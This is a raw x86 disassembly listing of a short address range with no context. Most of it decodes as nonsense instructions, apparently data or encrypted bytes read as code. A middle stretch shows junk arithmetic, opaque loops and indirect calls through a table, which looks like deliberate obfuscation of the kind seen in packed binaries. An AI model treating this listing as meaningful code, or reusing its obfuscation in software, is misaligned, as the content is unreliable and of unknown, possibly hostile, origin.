  40ef6a:	jnp    0x40ef10
  40ef6c:	outs   dx,BYTE PTR ds:[esi]
  40ef6d:	(bad)  
  40ef6f:	ss mov esp,0xcd415b9
  40ef75:	pop    DWORD PTR [edx-0x50]
  40ef78:	in     eax,dx
  40ef79:	aaa    
  40ef7a:	jp     0x40eff4
  40ef7c:	jmp    0xe9c3:0x35f83600
  40ef83:	hlt    
  40ef84:	out    0xd7,al
  40ef86:	div    BYTE PTR [ecx]
  40ef88:	jbe    0x40efa9
  40ef8a:	xlat   BYTE PTR ds:[ebx]
  40ef8b:	mov    ds:0x7f2ed5e1,al
  40ef90:	iret   
  40ef91:	rcl    DWORD PTR [edx+0x4150b9ca],0x2b
  40ef98:	sbb    DWORD PTR [ecx],ebx
  40ef9a:	mov    DWORD PTR [edi-0x8060754],ecx
  40efa0:	retf   0x7895
  40efa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efa4:	fwait
  40efa5:	cmp    ah,BYTE PTR [ebp-0x73]
  40efa8:	ja     0x40ef8a
  40efaa:	jo     0x40efc2
  40efac:	xchg   ecx,eax
  40efad:	cmovns ebx,DWORD PTR ds:0x60279dbc
  40efb4:	xor    al,0xbc
  40efb7:	mov    dh,0xc3
  40efb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efba:	push   ebx
  40efbb:	fstp   QWORD PTR [edx-0x53]
  40efbe:	lock gs dec eax
  40efc1:	mov    al,ds:0x2ec99101
  40efc6:	or     DWORD PTR [esi+0x24c2d666],ecx
  40efcc:	jae    0x40f014
  40efce:	(bad)  
  40efcf:	leave  
  40efd0:	adc    esi,esp
  40efd2:	jo     0x40efee
  40efd4:	add    BYTE PTR [esi],ah
  40efd6:	loopne 0x40efb6
  40efd8:	imul   DWORD PTR [edx]
  40efda:	cld    
  40efdb:	mov    bl,0x25
  40efdd:	and    BYTE PTR [ebx-0x108b560c],cl
  40efe3:	int    0x3a
  40efe5:	jg     0x40ef85
  40efe7:	mov    dl,0xde
  40efe9:	ret    
  40efea:	in     eax,dx
  40efeb:	push   esp
  40efec:	jmp    0x9034d0bb
  40eff1:	add    al,0xae
  40eff3:	loop   0x40effa
  40eff5:	test   al,0x9b
  40eff7:	test   BYTE PTR [ebp+0x52],al
  40effa:	pop    eax
  40effb:	xlat   BYTE PTR ds:[ebx]
  40effc:	jno    0x40efaf
  40effe:	pop    edx
  40efff:	imul   edx,DWORD PTR [edx+0x78756df9],0xe69a0e27
  40f009:	int    0xe7
  40f00b:	in     eax,dx
  40f00c:	in     al,0x2b
  40f00e:	add    ebp,esi
  40f010:	(bad)  
  40f011:	out    dx,eax
  40f012:	and    al,0xd8
  40f014:	in     al,0x8c
  40f016:	fs push ebp
  40f018:	fistp  QWORD PTR [edi]
  40f01a:	fnsave [edi]
  40f01c:	mov    bh,0xa9
  40f01e:	push   ds
  40f01f:	and    ecx,DWORD PTR [eax+0x38]
  40f022:	jns    0x40f095
  40f024:	ret    
  40f025:	xchg   ebp,eax
  40f026:	adc    BYTE PTR [edi-0x6a],bh
  40f029:	sbb    DWORD PTR [edx-0x569f995],0x15
  40f030:	pop    ds
  40f031:	pop    ebx
  40f032:	jae    0x40efb6
  40f034:	test   BYTE PTR [ecx+ecx*2],bl
  40f037:	xchg   esi,eax
  40f038:	into   
  40f039:	fdivr  QWORD PTR ds:0x5118766e
  40f03f:	mov    esi,0xdaff45f5
  40f044:	xchg   edi,eax
  40f045:	push   ss
  40f046:	mov    ah,0x11
  40f048:	xchg   DWORD PTR [ebx-0x15],ebx
  40f04b:	xchg   edi,eax
  40f04c:	push   es
  40f04d:	or     bl,bh
  40f04f:	xchg   ebx,eax
  40f050:	sbb    BYTE PTR [ebp+0xa],bl
  40f053:	jp     0x40f0ab
  40f055:	popf   
  40f056:	adc    eax,DWORD PTR [esp+ebx*2+0x419843bc]
  40f05d:	sub    BYTE PTR [ebp-0x5e64539a],bl
  40f063:	fadd   st,st(7)
  40f065:	addr16 sti 
  40f067:	xchg   edi,eax
  40f068:	popa   
  40f069:	xchg   edx,eax
  40f06a:	sbb    DWORD PTR [edi+0x2e],eax
  40f06d:	rcl    DWORD PTR [eax+0x76d16a48],cl
  40f073:	test   ecx,ebx
  40f075:	ins    DWORD PTR es:[edi],dx
  40f076:	into   
  40f077:	xor    DWORD PTR [eax-0xc823b2b],esp
  40f07d:	push   0xc
  40f07f:	les    edi,FWORD PTR [edi]
  40f081:	(bad)  [ebx]
  40f083:	add    BYTE PTR [ebx+ebp*2+0x55],bh
  40f087:	lods   eax,DWORD PTR ds:[esi]
  40f088:	clc    
  40f089:	adc    al,0x55
  40f08b:	ret    
  40f08c:	push   ds
  40f08d:	fsub   DWORD PTR ss:[ebx+ebx*2]
  40f091:	mov    esp,0xa9e4a466
  40f096:	repz pushf 
  40f098:	pop    ebx
  40f099:	dec    esp
  40f09a:	or     DWORD PTR [eax+0xa3b9632],edi
  40f0a0:	inc    ecx
  40f0a1:	fisubr WORD PTR [edx]
  40f0a3:	cs mov bh,0xb9
  40f0a6:	dec    edi
  40f0a7:	into   
  40f0a8:	mov    ch,BYTE PTR [edx-0x1]
  40f0ab:	jmp    0x294d7712
  40f0b0:	loopne 0x40f120
  40f0b2:	or     dl,BYTE PTR [esi+0x6b]
  40f0b5:	ret    0x5f97
  40f0b8:	push   esi
  40f0b9:	sti    
  40f0ba:	sbb    al,0x34
  40f0bc:	pop    edx
  40f0bd:	jmp    0x86d2:0x27c1e2a8
  40f0c4:	dec    ecx
  40f0c5:	mov    ebx,0xa20123e1
  40f0ca:	cmp    DWORD PTR [edi+0x7e68f329],edx
  40f0d0:	lods   eax,DWORD PTR ds:[esi]
  40f0d1:	icebp  
  40f0d2:	cdq    
  40f0d3:	fisub  WORD PTR [eax-0x4ae9b32f]
  40f0da:	jp     0x40f0f9
  40f0dc:	lods   al,BYTE PTR gs:[esi]
  40f0de:	lea    edi,[edi]
  40f0e0:	jbe    0x40f159
  40f0e2:	stc    
  40f0e3:	ret    0x73c3
  40f0e6:	jmp    0x3352:0xc56056a0
  40f0ed:	ret    
  40f0ee:	iret   
  40f0ef:	jns    0x40f072
  40f0f1:	xchg   edx,eax
  40f0f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0f3:	hlt    
  40f0f4:	or     ch,BYTE PTR [ecx-0x40]
  40f0f7:	lea    esp,[ecx-0x27ddcb7e]
  40f0fd:	sbb    BYTE PTR [edx],cl
  40f0ff:	inc    eax
  40f100:	mov    edx,esi
  40f102:	mov    eax,0x21184766
  40f107:	pop    ss
  40f108:	mov    ebx,0xf478a0d0
  40f10d:	jmp    0xb169a292
  40f112:	not    ecx
  40f114:	inc    eax
  40f115:	into   
  40f116:	retf   
  40f117:	pop    edi
  40f118:	test   DWORD PTR [edi],ebx
  40f11a:	mov    edx,0x3f209cdc
  40f11f:	pop    ecx
  40f120:	or     DWORD PTR [eax-0x3a],ebp
  40f123:	push   ecx
  40f124:	cld    
  40f125:	jle    0x40f142
  40f127:	push   0x72d686f8
  40f12c:	or     eax,ebp
  40f12e:	test   BYTE PTR [ecx-0x5b4494f0],dh
  40f134:	loop   0x40f1aa
  40f136:	adc    bl,BYTE PTR [edi-0x6e]
  40f139:	or     eax,ebx
  40f13b:	mov    BYTE PTR [ebx],bh
  40f13d:	mov    al,BYTE PTR [ebx-0x63438350]
  40f143:	in     eax,0xa0
  40f145:	fisttp DWORD PTR [edx]
  40f147:	ror    BYTE PTR [eax-0x3b6a4c45],1
  40f14d:	lds    edi,FWORD PTR gs:[ecx-0x6f]
  40f151:	(bad)  
  40f153:	xchg   edi,ecx
  40f155:	mov    ds:0x6ba4f0dd,al
  40f15a:	dec    esp
  40f15b:	dec    esp
  40f15c:	xchg   edi,eax
  40f15d:	(bad)  
  40f15e:	stc    
  40f15f:	add    al,BYTE PTR [esi]
  40f161:	test   BYTE PTR [ebx-0x52],al
  40f164:	fdivr  QWORD PTR [eax]
  40f166:	xchg   BYTE PTR [edx],bl
  40f168:	mov    ds:0x53740a2c,al
  40f16d:	scas   eax,DWORD PTR es:[edi]
  40f16e:	jns    0x40f109
  40f170:	mov    dl,0x24
  40f172:	movsx  edi,cl
  40f175:	bnd jmp 0x40f10e
  40f178:	dec    ebp
  40f179:	fld    TBYTE PTR [edx+eiz*8]
  40f17c:	call   0x824f2f31
  40f181:	cmp    al,0x6e
  40f183:	cmp    ebp,esi
  40f185:	xor    eax,0x724a053
  40f18a:	adc    esp,DWORD PTR [esi+0xe06bdb2]
  40f190:	pop    ecx
  40f191:	mov    cl,0xac
  40f193:	add    DWORD PTR [eax+0x245e4c6a],eax
  40f199:	mov    ss,WORD PTR [ebx-0x1de7967b]
  40f19f:	cmp    eax,0x5f16e981
  40f1a4:	cmp    eax,0xfed5944b
  40f1a9:	fld    TBYTE PTR [edx+edi*8-0x6a]
  40f1ad:	cmp    al,0x91
  40f1af:	lahf   
  40f1b0:	test   eax,0x694dd2d9
  40f1b5:	ficom  WORD PTR [esp+esi*4+0x594d429a]
  40f1bc:	lods   eax,DWORD PTR ds:[esi]
  40f1bd:	inc    eax
  40f1be:	push   esp
  40f1bf:	out    0x2,al
  40f1c1:	inc    edx
  40f1c2:	call   0x7dbc4b4a
  40f1c7:	mov    ebx,0x63579105
  40f1cc:	cmp    eax,0x325caa95
  40f1d1:	and    al,0xd
  40f1d3:	idiv   BYTE PTR ds:0x1d8111b9
  40f1d9:	adc    cl,cl
  40f1db:	bound  edi,QWORD PTR [ebp+0x72229d3f]
  40f1e1:	sti    
  40f1e2:	jl     0x40f206
  40f1e4:	cmp    edi,DWORD PTR [ecx]
  40f1e6:	fcmovne st,st(7)
  40f1e8:	sub    DWORD PTR [eax],ebp
  40f1ea:	adc    esi,esi
  40f1ec:	pushf  
  40f1ed:	sub    esi,DWORD PTR [edx]
  40f1ef:	inc    edi
  40f1f0:	pop    es
  40f1f1:	das    
  40f1f2:	jnp    0x40f183
  40f1f4:	sbb    dh,BYTE PTR [ebp+0x20]
  40f1f7:	mov    ds:0xd790a4a3,eax
  40f1fc:	sbb    ebp,esi
  40f1fe:	mov    esi,0xacbd91c3
  40f203:	adc    al,0x6f
  40f205:	adc    dl,ah
  40f207:	pop    esi
  40f208:	add    eax,0xad42b1ef
  40f20d:	stos   DWORD PTR es:[edi],eax
  40f20e:	dec    edx
  40f20f:	imul   eax,esp,0x2af1ca84
  40f215:	pop    ebx
  40f216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f217:	rcr    BYTE PTR [edx-0x4d],cl
  40f21a:	xchg   ebp,eax
  40f21b:	aam    0x99
  40f21d:	adc    DWORD PTR [edi+0x71],0x5c335e6a
  40f224:	pushf  
  40f225:	(bad)  
  40f226:	popf   
  40f227:	in     al,dx
  40f228:	inc    esp
  40f229:	js     0x40f221
  40f22b:	mov    bh,0xed
  40f22d:	leave  
  40f22e:	jo     0x40f1f8
  40f230:	gs jne 0x40f240
  40f233:	fimul  DWORD PTR [ecx+0x33]
  40f236:	or     eax,0x79b5ae0a
  40f23b:	rcr    edi,cl
  40f23d:	jmp    0x40f22a
  40f23f:	mov    ch,0x2a
  40f241:	inc    eax
  40f242:	jns    0x40f28e
  40f244:	or     BYTE PTR cs:[edx-0x51848dd3],bl
  40f24b:	bndldx (bad),[ebx]
  40f24e:	xchg   edx,eax
  40f24f:	mov    edi,0xeff59337
  40f254:	or     BYTE PTR [ebp+edi*8-0x34],bl
  40f258:	enter  0x8818,0x14
  40f25c:	adc    al,0xa4
  40f25e:	les    esp,FWORD PTR [edi+esi*1-0x33]
  40f262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f263:	enter  0x2204,0xcd
  40f267:	adc    DWORD PTR ds:[eax],0x7fd82ae4
  40f26e:	mov    edi,DWORD PTR [ecx-0x29]
  40f271:	jbe    0x40f2b6
  40f273:	inc    eax
  40f274:	add    cl,0x53
  40f277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f278:	dec    ecx
  40f279:	push   ss
  40f27a:	nop
  40f27b:	mov    WORD PTR [ebx],fs
  40f27d:	ja     0x40f21f
  40f27f:	inc    esp
  40f280:	sbb    cl,BYTE PTR [ebp+0x6e]
  40f283:	(bad)  
  40f284:	ja     0x40f2fd
  40f286:	jl     0x40f2e2
  40f288:	inc    ecx
  40f289:	and    BYTE PTR ss:[edx+ebx*2+0x3d],cl
  40f28e:	sub    ah,0x6
  40f291:	push   ecx
  40f292:	add    eax,0xa2234cff
  40f297:	xchg   esp,eax
  40f298:	xchg   edi,eax
  40f299:	adc    edi,eax
  40f29b:	dec    eax
  40f29c:	cmp    BYTE PTR [esi],0x18
  40f29f:	pop    ecx
  40f2a0:	lds    esi,FWORD PTR [ecx+0x7817d657]
  40f2a6:	xchg   edx,eax
  40f2a7:	cli    
  40f2a8:	pop    esi
  40f2a9:	in     al,dx
  40f2aa:	ret    
  40f2ab:	adc    DWORD PTR [edi+0x3d3a82ed],esi
  40f2b1:	cld    
  40f2b2:	cmp    al,dh
  40f2b4:	pop    ecx
  40f2b5:	(bad)  
  40f2b6:	popa   
  40f2b7:	hlt    
  40f2b8:	enter  0x2fe7,0xe4
  40f2bc:	or     ecx,DWORD PTR [ebp+ebp*4-0x299df6e2]
  40f2c3:	std    
  40f2c4:	(bad)  
  40f2c6:	sbb    dl,BYTE PTR [ebx]
  40f2c8:	jle    0x40f253
  40f2ca:	and    esi,edi
  40f2cc:	or     BYTE PTR [edx+edx*4-0x2b40a9d3],dl
  40f2d3:	inc    esi
  40f2d4:	mov    esi,0x1227974b
  40f2d9:	rcl    DWORD PTR [ebx-0x551a162b],cl
  40f2df:	xchg   esi,eax
  40f2e0:	in     eax,dx
  40f2e1:	aaa    
  40f2e2:	xor    BYTE PTR [esp+edx*4],dl
  40f2e5:	jns    0x40f365
  40f2e7:	ins    DWORD PTR es:[edi],dx
  40f2e8:	out    dx,eax
  40f2e9:	retf   0xb46b
  40f2ec:	push   es
  40f2ed:	jnp    0x40f2ea
  40f2ef:	aam    0x71
  40f2f1:	ja     0x40f305
  40f2f3:	mov    al,0x1
  40f2f5:	ja     0x40f2ce
  40f2f7:	rol    dl,1
  40f2f9:	loop   0x40f354
  40f2fb:	xor    BYTE PTR [ebx-0xb30be01],ch
  40f301:	pop    ss
  40f302:	into   
  40f303:	push   edx
  40f304:	mov    edx,0x71d95aff
  40f309:	fwait
  40f30a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f30b:	or     BYTE PTR [ebp-0x3e99582c],dl
  40f311:	jmp    0x40f356
  40f313:	cli    
  40f314:	pop    edi
  40f315:	nop
  40f316:	or     BYTE PTR [ebx-0x79fa947b],cl
  40f31c:	mov    edx,0xc004b668
  40f321:	js     0x40f2a4
  40f323:	loop   0x40f36d
  40f325:	pop    ecx
  40f326:	sub    esp,eax
  40f328:	test   DWORD PTR [edx-0x440ddf2e],ebx
  40f32e:	jo     0x40f382
  40f330:	xor    dl,BYTE PTR [ecx-0x19510777]
  40f336:	icebp  
  40f337:	sbb    BYTE PTR [esi-0x731f006f],dl
  40f33d:	int    0x37
  40f33f:	test   BYTE PTR [esi+0x57],0xd6
  40f343:	add    DWORD PTR [ebx+ebx*2],ecx
  40f346:	fwait
  40f347:	add    al,0x8e
  40f349:	pop    ebx
  40f34a:	sbb    al,0xb9
  40f34c:	xor    eax,0x8c4d0105
  40f351:	xchg   BYTE PTR [edx+0x3],bl
  40f354:	xlat   BYTE PTR ds:[ebx]
  40f355:	or     DWORD PTR ds:0x434004,0x43601c
  40f35f:	and    edx,ebx
  40f361:	mov    DWORD PTR [ebp-0x4c],edx
  40f364:	sbb    ebx,edx
  40f366:	mov    edx,DWORD PTR [ebp+0x8]
  40f369:	and    ebx,DWORD PTR ds:0x436000
  40f36f:	mov    ebx,DWORD PTR [ebp-0x48]
  40f372:	and    DWORD PTR ds:0x434008,0x438000
  40f37c:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f383:	movzx  ebx,BYTE PTR ds:0x437010
  40f38a:	and    DWORD PTR ds:0x438004,ebx
  40f390:	mov    DWORD PTR [ebp-0x48],edx
  40f393:	and    ebx,DWORD PTR ds:0x43501c
  40f399:	mov    edx,DWORD PTR [ebp+0x8]
  40f39c:	mov    ebx,0xfa5e15e2
  40f3a1:	sub    ebx,edx
  40f3a3:	or     DWORD PTR ds:0x43801c,0x224f
  40f3ad:	add    ebx,DWORD PTR [ebp-0x44]
  40f3b0:	mov    DWORD PTR [ebp-0x44],ebx
  40f3b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f3b6:	xor    edx,eax
  40f3b8:	or     DWORD PTR ds:0x43801c,0x42c8
  40f3c2:	add    edx,esi
  40f3c4:	mov    DWORD PTR ds:0x434008,0x7004
  40f3ce:	jne    0x40ab4e
  40f3d4:	jmp    0x4163dd
  40f3d9:	mov    DWORD PTR ds:0x438008,0x1c
  40f3e3:	cmp    DWORD PTR ds:0x438008,0x0
  40f3ea:	je     0x40f448
  40f3f0:	cmp    DWORD PTR ds:0x438008,0x4
  40f3f7:	jl     0x40f448
  40f3fd:	jmp    0x40f41a
  40f402:	push   DWORD PTR [ebp-0x24]
  40f405:	push   0x3847
  40f40a:	push   0x753d
  40f40f:	push   0x26fc
  40f414:	call   DWORD PTR ds:0x43a8e8
  40f41a:	cmp    DWORD PTR ds:0x438008,0x5
  40f421:	jne    0x40f436
  40f427:	xor    edx,edx
  40f429:	xor    edx,DWORD PTR ds:0x438008
  40f42f:	dec    edx
  40f430:	mov    DWORD PTR ds:0x438008,edx
  40f436:	mov    edx,DWORD PTR ds:0x438008
  40f43c:	dec    edx
  40f43d:	mov    DWORD PTR ds:0x438008,edx
  40f443:	jmp    0x40f3e3
  40f448:	mov    edx,DWORD PTR [ebp-0xc]
  40f44b:	neg    DWORD PTR ds:0x434004
  40f451:	sub    edx,esi
  40f453:	xor    edx,eax
  40f455:	mov    DWORD PTR [ebp-0x5c],edx
  40f458:	mov    edx,DWORD PTR [ebp-0x10]
  40f45b:	mov    ebx,DWORD PTR [ebp-0x8]
  40f45e:	or     DWORD PTR ds:0x438018,0x434020
  40f468:	xor    edx,eax
  40f46a:	xor    ebx,eax
  40f46c:	adc    DWORD PTR ds:0x438000,0x7999
  40f476:	sub    edx,ebx
  40f478:	and    DWORD PTR ds:0x43500c,0x6f6
  40f482:	sub    edx,esi
  40f484:	xor    edx,eax
  40f486:	mov    DWORD PTR [ebp-0x10],edx
  40f489:	mov    DWORD PTR ds:0x435000,0x69ba
  40f493:	mov    edx,DWORD PTR [ebp-0x14]
  40f496:	mov    DWORD PTR ds:0x436008,0x7efb
  40f4a0:	mov    DWORD PTR [ebp+0x8],edx
  40f4a3:	jmp    0x40f6a5
  40f4a8:	mov    DWORD PTR ds:0x434000,0x12
  40f4b2:	cmp    DWORD PTR ds:0x434000,0x0
  40f4b9:	je     0x40f505
  40f4bf:	cmp    DWORD PTR ds:0x434000,0x4
  40f4c6:	jb     0x40f505
  40f4cc:	jmp    0x40f4d7
  40f4d1:	call   DWORD PTR ds:0x43a8f0
  40f4d7:	cmp    DWORD PTR ds:0x434000,0x5
  40f4de:	jne    0x40f4f3
  40f4e4:	xor    edx,edx
  40f4e6:	xor    edx,DWORD PTR ds:0x434000
  40f4ec:	dec    edx
  40f4ed:	mov    DWORD PTR ds:0x434000,edx
  40f4f3:	mov    edx,DWORD PTR ds:0x434000
  40f4f9:	dec    edx
  40f4fa:	mov    DWORD PTR ds:0x434000,edx
  40f500:	jmp    0x40f4b2
  40f505:	mov    edx,DWORD PTR [ebp+0x8]
  40f508:	mov    ebx,DWORD PTR [ebp-0x8]
  40f50b:	adc    DWORD PTR ds:0x436008,0x434014
  40f515:	xor    edx,eax
  40f517:	sub    DWORD PTR ds:0x438010,0x434018
  40f521:	xor    ebx,eax
  40f523:	sub    edx,ebx
  40f525:	sub    edx,esi
  40f527:	and    DWORD PTR ds:0x437014,0x0
  40f531:	mov    ebx,DWORD PTR ds:0x437014
  40f537:	inc    ebx
  40f538:	mov    DWORD PTR ds:0x437014,ebx
  40f53e:	cmp    DWORD PTR ds:0x437014,0x4
  40f545:	jge    0x40f582
  40f54b:	jmp    0x40f55b
  40f550:	push   0x7690
  40f555:	call   DWORD PTR ds:0x43a8f4
  40f55b:	cmp    DWORD PTR ds:0x437014,0x3
  40f562:	jne    0x40f575
  40f568:	mov    ebx,DWORD PTR ds:0x437014
  40f56e:	inc    ebx
  40f56f:	mov    DWORD PTR ds:0x437014,ebx
  40f575:	cmp    DWORD PTR ds:0x437014,0x1b
  40f57c:	jb     0x40f531
  40f582:	xor    edx,eax
  40f584:	movzx  ebx,WORD PTR ds:0x435010
  40f58b:	adc    DWORD PTR ds:0x434020,ebx
  40f591:	mov    DWORD PTR [ebp+0x8],edx
  40f594:	and    DWORD PTR ds:0x435018,0x0
  40f59e:	jmp    0x40f5b0
  40f5a3:	mov    edx,DWORD PTR ds:0x435018
  40f5a9:	inc    edx
  40f5aa:	mov    DWORD PTR ds:0x435018,edx
  40f5b0:	cmp    DWORD PTR ds:0x435018,0x18
  40f5b7:	jae    0x40f5e4
  40f5bd:	cmp    DWORD PTR ds:0x435018,0x22
  40f5c4:	jbe    0x40f5e4
  40f5ca:	jmp    0x40f5df
  40f5cf:	push   0x6f28
  40f5d4:	push   0x4b78
  40f5d9:	call   DWORD PTR ds:0x43a8f8
  40f5df:	jmp    0x40f5a3
  40f5e4:	mov    edx,DWORD PTR [ebp+0x8]
  40f5e7:	sbb    DWORD PTR ds:0x434004,edx
  40f5ed:	mov    ebx,DWORD PTR [ebp-0x58]
  40f5f0:	add    edx,0x5708c4
  40f5f6:	adc    DWORD PTR ds:0x437004,0x434004
  40f600:	imul   edx,ebx
  40f603:	mov    ebx,DWORD PTR ds:0x43701c
  40f609:	adc    DWORD PTR ds:0x43801c,ebx
  40f60f:	mov    DWORD PTR [ebp-0x58],edx
  40f612:	mov    edx,DWORD PTR [ebp+0x8]
  40f615:	xor    DWORD PTR ds:0x435010,edx
  40f61b:	mov    ebx,DWORD PTR [ebp-0x54]
  40f61e:	adc    DWORD PTR ds:0x43600c,0x437010
  40f628:	add    edx,0x64f8da
  40f62e:	or     edx,ebx
  40f630:	mov    DWORD PTR [ebp-0x54],edx
  40f633:	mov    edx,DWORD PTR [ebp+0x8]
  40f636:	adc    ebx,DWORD PTR ds:0x436014
  40f63c:	mov    ebx,DWORD PTR [ebp-0x50]
  40f63f:	add    edx,ecx
  40f641:	adc    DWORD PTR ds:0x43401c,0x78dc
  40f64b:	xor    edx,ebx
  40f64d:	adc    DWORD PTR ds:0x437014,0x50e3
  40f657:	mov    DWORD PTR [ebp-0x50],edx
  40f65a:	adc    DWORD PTR ds:0x434008,0x291b
  40f664:	mov    edx,DWORD PTR [ebp+0x8]
  40f667:	mov    ebx,DWORD PTR [ebp-0x4c]
  40f66a:	and    DWORD PTR ds:0x438010,0x434004
  40f674:	add    edx,edi
  40f676:	add    DWORD PTR ds:0x436018,0x43800c
  40f680:	and    edx,ebx
  40f682:	mov    DWORD PTR [ebp-0x4c],edx
  40f685:	mov    edx,DWORD PTR [ebp+0x8]
  40f688:	mov    ebx,DWORD PTR [ebp-0x48]
  40f68b:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f692:	mov    DWORD PTR [ebp-0x48],edx
  40f695:	mov    edx,DWORD PTR [ebp+0x8]
  40f698:	mov    ebx,0xfa5e15e2
  40f69d:	sub    ebx,edx
  40f69f:	add    ebx,DWORD PTR [ebp-0x44]
  40f6a2:	mov    DWORD PTR [ebp-0x44],ebx
  40f6a5:	mov    edx,DWORD PTR [ebp+0x8]
  40f6a8:	xor    edx,eax
  40f6aa:	add    edx,esi
  40f6ac:	jne    0x40f4a8
  40f6b2:	mov    edx,DWORD PTR [ebp-0xc]
  40f6b5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6bc:	mov    bl,BYTE PTR [ebp-0x1]
  40f6bf:	cmp    dl,bl
  40f6c1:	je     0x411b53
  40f6c7:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6ca:	mov    edx,DWORD PTR [ebp-0xc]
  40f6cd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6d4:	mov    ebx,DWORD PTR [ebp+0xc]
  40f6d7:	xor    ecx,eax
  40f6d9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  40f6e0:	jne    0x4163ef
  40f6e6:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6e9:	mov    edx,DWORD PTR [ebp+0xc]
  40f6ec:	xor    ecx,eax
  40f6ee:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  40f6f6:	jmp    0x411aaa
  40f6fb:	ficomp WORD PTR ds:0x81a319e0
  40f701:	xchg   DWORD PTR [ebx-0x12a5fb05],ebx
  40f707:	shr    ebx,0x36
  40f70a:	push   0x7c7ccddc
  40f70f:	jmp    0x40f770
  40f711:	jl     0x40f78f
  40f713:	call   0xec11747b
  40f718:	mov    edi,0xfa20f4f
  40f71d:	mov    bl,0xfc
  40f71f:	pop    ebx
  40f720:	push   ebx
  40f721:	mov    ecx,DWORD PTR [esi+0x492ef2ba]
  40f727:	aas    
  40f728:	outs   dx,BYTE PTR ds:[esi]
  40f729:	jne    0x40f769
  40f72b:	sti    
  40f72c:	add    bh,BYTE PTR [eax+0x747a97b6]
  40f732:	or     al,bl
  40f734:	(bad)  
  40f735:	(bad)  
  40f736:	push   eax
  40f737:	rcl    ah,1
  40f739:	push   edi
  40f73a:	xchg   BYTE PTR [edi],dl
  40f73c:	push   ss
  40f73d:	pop    ebx
  40f73e:	sub    DWORD PTR [edi],ebx
  40f740:	pop    ss
  40f741:	mov    dl,0xb1
  40f743:	pushw  ds
  40f745:	enter  0x55e1,0xf3
  40f749:	daa    
  40f74a:	scas   al,BYTE PTR es:[edi]
  40f74b:	add    eax,0x1bf4d4f3
  40f750:	add    dh,dh
  40f752:	in     al,0x1e
  40f754:	out    dx,eax
  40f755:	xor    al,0x94
  40f757:	or     DWORD PTR [eax-0x5],edi
  40f75a:	dec    edi
  40f75b:	ror    WORD PTR [ebx-0xa7c1f38],cl
  40f762:	stos   DWORD PTR es:[edi],eax
  40f763:	ds xor dh,dl
  40f766:	(bad)  
  40f767:	hlt    
  40f768:	pop    edx
  40f769:	adc    al,0x48
  40f76b:	repz xor DWORD PTR [esi],edi
  40f76e:	add    bh,BYTE PTR [esi-0x3]
  40f771:	or     BYTE PTR [eax],0x21
  40f774:	mov    cl,0x9a
  40f776:	mov    esi,0xbe0c2a55
  40f77b:	stos   BYTE PTR es:[edi],al
  40f77c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f77d:	aam    0x51
  40f77f:	dec    edx
  40f780:	mov    ds:0xaeef9895,eax
  40f785:	inc    edx
  40f786:	jo     0x40f7ab
  40f788:	ins    DWORD PTR es:[edi],dx
  40f789:	fnstsw WORD PTR [edi+0x26b35907]
  40f78f:	ss repz pop edx
  40f792:	fwait
  40f793:	jno    0x40f7ef
  40f795:	pop    edx
  40f796:	fabs   
  40f798:	pushf  
  40f799:	pop    esi
  40f79a:	jmp    0x7139:0x1bf216c5
  40f7a1:	(bad)  
  40f7a2:	add    DWORD PTR [ebp+0x3ad98d4d],0x1a1fe6da
  40f7ac:	cmp    DWORD PTR [esi+0x25e48a9a],esi
  40f7b2:	adc    ecx,DWORD PTR [ecx+ecx*1]
  40f7b5:	mov    al,0xb3
  40f7b7:	push   0x31c102d7
  40f7bc:	xchg   esp,eax
  40f7bd:	dec    ecx
  40f7be:	fiadd  DWORD PTR [edx]
  40f7c0:	call   0x45cf8546
  40f7c5:	scas   eax,DWORD PTR es:[edi]
  40f7c6:	repnz test eax,0xda2d4afe
  40f7cc:	jge    0x40f75a
  40f7ce:	mov    al,ds:0xd28aabca
  40f7d3:	mov    al,ds:0x77b171a4
  40f7d8:	jns    0x40f7cc
  40f7da:	jno    0x40f817
  40f7dc:	xchg   edi,eax
  40f7dd:	sahf   
  40f7de:	mov    ebx,0x1bb95ca9
  40f7e3:	mov    DWORD PTR [ebx+ecx*4],esi
  40f7e6:	or     ebp,ecx
  40f7e8:	imul   edi,ecx,0xfffffff3
  40f7eb:	mov    ch,0xcc
  40f7ed:	and    ecx,DWORD PTR [edi+edx*8-0x2be24dd1]
  40f7f4:	(bad)  
  40f7f5:	gs mov bl,0x3
  40f7f8:	fs ins DWORD PTR es:[edi],dx
  40f7fa:	mov    ds:0xef190dfb,al
  40f7ff:	loop   0x40f7ad
  40f801:	add    edi,eax
  40f803:	cli    
  40f804:	mul    DWORD PTR [edx+0x7339dbee]
  40f80a:	scas   al,BYTE PTR es:[edi]
  40f80b:	arpl   WORD PTR [edx+eax*8-0xa],si
  40f80f:	out    0xcd,eax
  40f811:	and    DWORD PTR [ebp+eiz*8-0x3a3fd814],0xadb0a8cf
  40f81c:	call   0xd2d9:0x5116e056
  40f823:	mov    eax,0x2e4615b8
  40f828:	nop
  40f829:	hlt    
  40f82a:	das    
  40f82b:	cmc    
  40f82c:	leave  
  40f82d:	mov    eax,0x668b2d90
  40f832:	jecxz  0x40f848
  40f834:	mov    ch,0x3c
  40f836:	mov    cl,0xda
  40f838:	test   al,0x1b
  40f83a:	lods   al,BYTE PTR ds:[esi]
  40f83b:	lock imul edi,ecx,0xfbb88b59
  40f842:	push   ss
  40f843:	sbb    al,0x98
  40f845:	mov    bh,0xbf
  40f847:	adc    ch,BYTE PTR [edi]
  40f849:	test   ebx,eax
  40f84b:	imul   eax,eax,0x2579471d
  40f851:	clc    
  40f852:	xor    BYTE PTR [eax],ch
  40f854:	jp     0x40f88c
